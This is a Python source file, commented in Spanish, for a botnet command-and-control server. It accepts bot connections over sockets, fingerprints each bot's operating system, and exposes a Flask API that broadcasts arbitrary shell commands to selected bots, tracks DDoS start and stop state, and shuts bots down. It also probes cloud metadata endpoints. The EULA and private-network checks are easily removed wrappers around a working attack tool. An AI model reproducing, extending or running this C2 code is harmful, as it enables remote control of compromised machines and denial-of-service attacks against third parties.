import logging
import socket
import sys
import threading
import time
import os
import ipaddress
import requests
import sqlite3
import configparser
from flask import Flask, jsonify, request

app = Flask(__name__)

bots = []  # Lista de bots
bot_ids = {}  # Diccionario con los IDs de los bots
sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot
server_running = True  # Variable para controlar el estado del servidor

def configurar_logging(config):
    """
    Configura el sistema de logging del servidor.
    """
    try:
        log_level = config["LOG_LEVEL"].upper()
        log_file = config["SERVER_LOG_FILE"]

        log_levels = {
            "DEBUG": logging.DEBUG,
            "INFO": logging.INFO,
            "WARNING": logging.WARNING,
            "ERROR": logging.ERROR,
            "CRITICAL": logging.CRITICAL
        }
        log_level = log_levels.get(log_level, logging.INFO)

        os.makedirs(os.path.dirname(log_file), exist_ok=True)

        logging.basicConfig(
            level=log_level,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler(log_file, encoding="utf-8"),
                logging.StreamHandler(sys.stdout)
            ]
        )

        logging.info("Sistema de logging configurado correctamente.")
    except Exception as e:
        logging.error(f"Error al configurar el logging: {e}")

# Inicializar la base de datos
def init_db(DB_PATH):
    """
    Inicializa la base de datos SQLite para almacenar información sobre los bots.
    """
    try:
        db_dir = os.path.dirname(DB_PATH)
        if not os.path.exists(db_dir):
            os.makedirs(db_dir)  # Crear carpeta si no existe

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            ip TEXT UNIQUE,
                            hostname TEXT,
                            os TEXT,
                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                        )''')

        conn.commit()
        conn.close()
        logging.info("Base de datos inicializada correctamente.")
    except Exception as e:
        logging.error(f"Error al inicializar la base de datos: {e}")

def detectarEntornoCloud():
    """
    Detecta si el entorno actual es un entorno de cloud computing.
    """
    try:
        try:
            # AWS Metadata
            if requests.get("http://169.254.169.254/latest/meta-data/", timeout=1).status_code == 200:
                logging.info("Entorno de cloud computing detectado.")
                return True
        except requests.exceptions.RequestException:
            pass

        try:
            # Google Cloud Metadata
            if requests.get("http://metadata.google.internal/", timeout=1).status_code == 200:
                logging.info("Entorno de cloud computing detectado.")
                return True
        except requests.exceptions.RequestException:
            pass

        return False
    except Exception as e:
        logging.error(f"Error al detectar el entorno cloud: {e}")
        return False

def esRedPrivada(ip):
    """
    Indica si una IP es de una red privada o no.
    """
    try:
        result = ipaddress.ip_address(ip).is_private
        logging.info(f"Verificación de red privada para la IP: {ip}")
        return result
    except ValueError as e:
        logging.error(f"Error al verificar si la IP es privada: {e}")
        return False

def verificar_eula(tipo):
    """
    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.
    """
    try:
        if tipo not in ["servidor", "cliente"]:
            raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")

        # Ruta para el archivo EULA en la carpeta docs
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        eula_path = os.path.join(BASE_DIR, "..", "docs", f"eula_{tipo}.txt")

        # Si no existe, lo crea
        if not os.path.exists(eula_path):
            with open(eula_path, "w") as f:
                f.write("ACCEPTED=False")

        # Leer si ya aceptó
        with open(eula_path, "r") as f:
            for linea in f:
                if "ACCEPTED=True" in linea:
                    logging.info(f"Verificación de EULA para el tipo: {tipo}")
                    return True

        # Mostrar Acuerdo de Licencia
        print("\n" + "="*50)
        print(f"📜  ACUERDO DE LICENCIA ({tipo.upper()}) 📜")
        print("="*50)
        print("\nEste software es exclusivamente para propósitos educativos y de investigación.")
        print("El uso en redes ajenas sin autorización está prohibido.")
        print("El usuario debe cumplir con las leyes de su país.")
        print("No se permite el uso de este software en redes públicas.")
        print("El autor no se hace responsable del uso indebido.\n")
        print("EL SOFTWARE NO FUNCIONARÁ FUERA DE UNA RED PRIVADA.\n")
        
        print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
        print("   - Usarlo con intenciones maliciosas.")
        print("   - Ejecutarlo en infraestructuras críticas sin permiso.")
        print("   - Modificarlo para evadir restricciones.")
        print("   - Distribuirlo con fines ilegales o comerciales.\n")
        
        print("💡  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\n")
        
        respuesta = input("Escriba 'ACEPTO' para continuar: ").strip().upper()
        
        if respuesta == "ACEPTO":
            with open(eula_path, "w") as f:
                f.write("ACCEPTED=True")
            logging.info(f"Verificación de EULA para el tipo: {tipo}")
            return True
        else:
            print("Debe aceptar la licencia para usar este software.")
            exit()
    except Exception as e:
        logging.error(f"Error al verificar el EULA: {e}")
        exit()

def manejar_bot(conn, addr, bot_id):
    """
    Maneja una conexión de bot y la agrega a la lista de bots.
    """
    try:
        logging.info(f"Bot {bot_id} conectado desde {addr}")
        print(f"Bot {bot_id} conectado desde {addr}")

        # Detectar sistema operativo
        try:
            conn.send("detect_os".encode("utf-8"))
            os_info = conn.recv(1024).decode("utf-8").strip().lower()
            sistemas_operativos[conn] = "windows" if "windows" in os_info else "linux"
            print(f"Bot {bot_id} identificado como {sistemas_operativos[conn].capitalize()}")
        except Exception as e:
            print(f"Error al detectar OS de {addr}: {e}")
            sistemas_operativos[conn] = "desconocido"

        while True:
            try:
                data = conn.recv(4096).decode("utf-8", errors="ignore").strip()
                if not data:
                    continue

                # Guardar la respuesta en el diccionario sin imprimirla
                respuestas_bots[bot_id] = data

            except socket.timeout:
                print(f"Tiempo de espera agotado con {addr}.")
            except Exception as e:
                print(f"Error con {addr}: {e}")
                break

        # Manejo de desconexión
        conn.close()
        if conn in bots:
            bots.remove(conn)
        if conn in bot_ids:
            del bot_ids[conn]
        if conn in sistemas_operativos:
            del sistemas_operativos[conn]
        logging.info(f"Bot {bot_id} desconectado")
        print(f"Bot {bot_id} desconectado")
    except Exception as e:
        logging.error(f"Error al manejar el bot {bot_id}: {e}")
    finally:
        conn.close()
        if conn in bots:
            bots.remove(conn)
        if conn in bot_ids:
            del bot_ids[conn]
        if conn in sistemas_operativos:
            del sistemas_operativos[conn]
        logging.info(f"Bot {bot_id} desconectado")
        print(f"Bot {bot_id} desconectado")

def servidor_CnC(HOST, PORT):
    global server_running
    """
    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia
    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo
    para aceptar conexiones y entra en un bucle para mostrar un menú principal
    que permite al usuario interactuar con los bots conectados.
    """
    try:
        logging.info(f"Iniciando servidor CnC en {HOST}:{PORT}")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crear el socket
        server.bind((HOST, PORT))  # Asociar el socket a la IP y el puerto
        server.listen(5)  # Escuchar conexiones
        server.settimeout(1)  # Añadir timeout para poder cerrar limpiamente
        print(f"Escuchando en {HOST}:{PORT}...")  # Imprimir que el servidor está escuchando
        
        aceptar_thread = threading.Thread(target=aceptar_conexiones, args=(server,))
        aceptar_thread.start()

        try:
            while server_running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nCerrando servidor...")
        finally:
            server_running = False
            server.close()
            aceptar_thread.join()
            
            # Cerrar todas las conexiones
            for bot in bots[:]:
                try:
                    bot.close()
                except:
                    pass
            
            print("Servidor cerrado correctamente")
    except Exception as e:
        logging.error(f"Error en el servidor CnC: {e}")

def aceptar_conexiones(server):
    global server_running
    """
    Acepta conexiones de bots y las asigna a un hilo para manejarlas.
    """
    try:
        logging.info("Aceptando conexiones de bots")
        bot_id = 1  # Contador de bots
        while server_running:
            try:
                conn, addr = server.accept()  # Aceptar la conexión
                bots.append(conn)  # Agregar el bot a la lista
                bot_ids[conn] = bot_id  # Asignar el ID del bot
                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()  # Crear un hilo para manejar la conexión
                bot_id += 1  # Incrementar el contador de bots
            except OSError:
                if not server_running:
                    break
                else:
                    raise
    except Exception as e:
        logging.error(f"Error al aceptar conexiones: {e}")

@app.route('/listar_bots', methods=['GET'])
def listar_bots():
    """
    Muestra la lista de bots conectados al servidor C&C.
    """
    try:
        logging.info("Listando bots conectados")
        if bots:
            bots_info = []
            for bot in bots:  # Recorrer la lista de bots
                so = sistemas_operativos.get(bot, "Desconocido")  # Obtener el SO del bot
                bots_info.append({
                    "id": bot_ids[bot],
                    "so": so.capitalize(),
                    "direccion": bot.getpeername()
                })
            return jsonify(bots_info)
        else:
            return jsonify({"message": "No hay bots conectados."})
    except Exception as e:
        logging.error(f"Error al listar bots: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/enviar_comando', methods=['POST'])
def enviar_comando():
    """
    Envía un comando a un conjunto de bots seleccionados.
    """
    try:
        data = request.json
        comando_windows = data.get("comando_windows")
        comando_linux = data.get("comando_linux")
        tipo_comando = data.get("tipo_comando", None)
        
        logging.info("Enviando comando a los bots seleccionados")
        if not bots:
            return jsonify({"message": "No hay bots conectados."})

        seleccion = data.get("seleccion")
        bots_seleccionados = []

        if seleccion == "1":
            bots_seleccionados = bots
        elif seleccion == "2":
            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "windows"]
        elif seleccion == "3":
            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "linux"]
        elif seleccion == "4":
            bot_id = data.get("bot_id")
            bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)
            if bot:
                bots_seleccionados.append(bot)
            else:
                return jsonify({"message": "ID de bot no válido."})
        elif seleccion == "5":
            bot_ids_seleccionados = data.get("bot_ids_seleccionados")
            bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]
            if not bots_seleccionados:
                return jsonify({"message": "No se encontraron bots con los IDs proporcionados."})
        else:
            return jsonify({"message": "Opción no válida."})

        respuestas = {}

        for bot in bots_seleccionados:
            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)

        return jsonify({"respuestas": respuestas})
    except Exception as e:
        logging.error(f"Error al enviar comando: {e}")
        return jsonify({"error": str(e)}), 500

def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):
    """
    Envía un comando a un bot específico basado en su sistema operativo.
    """
    try:
        logging.info(f"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}")
        so = sistemas_operativos.get(bot, "desconocido")
        comando = comando_windows if so == "windows" else comando_linux
        bot_id = bot_ids.get(bot, "Desconocido")

        try:
            bot.send(comando.encode('utf-8'))
            print(f"\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\n")

            # Esperar hasta que `manejar_bot()` almacene la respuesta
            tiempo_maximo = 5  # Segundos
            tiempo_inicial = time.time()

            while time.time() - tiempo_inicial < tiempo_maximo:
                if bot_id in respuestas_bots:
                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta
                    if tipo_comando == "ddos_start":
                        ddos_status[bot_id] = "running"
                    elif tipo_comando == "ddos_stop":
                        ddos_status[bot_id] = "stopped"
                    print(f"\n--- Respuesta del Bot {bot_id} ---\n{respuesta}\n")
                    return respuesta if respuesta else "[INFO] Comando ejecutado sin salida"
                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente

            return "[ERROR] No hubo respuesta del bot (Timeout)"

        except (socket.error, BrokenPipeError):
            print(f"[✗] Bot {bot_id} desconectado.")
            if bot in bots:
                bots.remove(bot)
            if bot in bot_ids:
                del bot_ids[bot]
            if bot in sistemas_operativos:
                del sistemas_operativos[bot]
            return "[ERROR] El bot se ha desconectado."
    except Exception as e:
        logging.error(f"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}")

@app.route('/cerrar_conexion', methods=['POST'])
def cerrar_conexion():
    """
    Cierra la conexión con un bot seleccionado por el usuario.
    """
    try:
        data = request.json
        bot_id = data.get("bot_id")
        
        logging.info("Cerrando conexión con los bots seleccionados")
        if not bots:
            return jsonify({"message": "No hay bots conectados."})

        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente
        
        if not bot:  # Si no se encuentra el bot
            return jsonify({"message": f"ID de bot {bot_id} no válido."})

        try:
            bot.close()  # Cerrar la conexión
            print(f"Conexión con el bot {bot_id} cerrada.")  # Imprimir un mensaje de confirmación
        except Exception as e:
            print(f"Error al cerrar la conexión con el bot {bot_id}: {e}")

        if bot in bots:
            bots.remove(bot)  # Eliminar el bot de la lista

        if bot in bot_ids:
            del bot_ids[bot]  # Eliminar el ID del bot

        if bot in sistemas_operativos:
            del sistemas_operativos[bot]  # Eliminar el SO del bot

        return jsonify({"message": f"Bot {bot_id} eliminado correctamente del sistema."})
    except Exception as e:
        logging.error(f"Error al cerrar conexión con el bot {bot_id}: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/shutdown', methods=['POST'])
def shutdown():
    """
    Apaga el servidor y cierra todas las conexiones.
    """
    try:
        global server_running
        server_running = False
        
        # Cerrar todas las conexiones de bots
        for bot in bots[:]:  # Usar una copia de la lista para evitar problemas al modificarla
            try:
                bot.send("shutdown".encode('utf-8'))
                bot.close()
                bots.remove(bot)
            except:
                pass
                
        # Limpiar diccionarios
        bot_ids.clear()
        sistemas_operativos.clear()
        respuestas_bots.clear()
        
        return jsonify({"message": "Servidor apagado correctamente"})
    except Exception as e:
        logging.error(f"Error al apagar el servidor: {e}")
        return jsonify({"error": str(e)}), 500

def cargar_configuracion():
    """
    Carga la configuración del servidor desde un archivo "config.ini" ubicado
    en el directorio "config" del proyecto.
    """
    try:
        logging.info("Cargando configuración del servidor")
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        CONFIG_DIR = os.path.join(BASE_DIR, "..", "config")
        CONFIG_PATH = os.path.join(CONFIG_DIR, "config.ini")

        if not os.path.exists(CONFIG_PATH):
            raise FileNotFoundError(f"[ERROR] No se encontró el archivo de configuración: {CONFIG_PATH}")

        config = configparser.ConfigParser()
        config.read(CONFIG_PATH)

        return {
            "BASE_DIR": BASE_DIR,
            "HOST": config.get("NETWORK", "HOST"),
            "PORT": config.getint("NETWORK", "PORT"),
            "MAX_CONNECTIONS": config.getint("NETWORK", "MAX_CONNECTIONS"),
            "DB_PATH": os.path.join(BASE_DIR, config.get("DATABASE", "DB_PATH")),
            "SECRET_KEY": config.get("SECURITY", "SECRET_KEY"),
            "HASH_ALGORITHM": config.get("SECURITY", "HASH_ALGORITHM"),
            "LOG_LEVEL": config.get("LOGGING", "LOG_LEVEL"),
            "SERVER_LOG_FILE": os.path.join(BASE_DIR, "..", config.get("LOGGING", "LOG_DIR"), config.get("LOGGING", "SERVER_LOG_FILE"))
        }
    except Exception as e:
        logging.error(f"Error al cargar la configuración: {e}")
        exit(1)

def iniciar_servidor():
    """
    Inicializa el servidor de Comando y Control (C2) verificando primero
    que no se ejecute en una red privada y mostrando un aviso de EULA.

    Luego, inicializa la base de datos, configura el sistema de logging y
    lanza el servidor de C2.

    :return: None
    """
    try:
        logging.info("Iniciando servidor de Comando y Control (C2)")
        config = cargar_configuracion()
        configurar_logging(config)  # Pasar el objeto de configuración en lugar de la cadena
        if not esRedPrivada(config["HOST"]):
            input("[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.")
            sys.exit(1)
        verificar_eula("servidor")
        init_db(config["DB_PATH"])
        servidor_CnC(config["HOST"], config["PORT"])
        logging.info("Servidor de Comando y Control (C2) iniciado correctamente")
    except Exception as e:
        logging.error(f"Error al iniciar el servidor: {e}")

if __name__ == "__main__":
    try:
        iniciar_servidor()
    except Exception as e:
        logging.error(f"Error en la ejecución principal: {e}")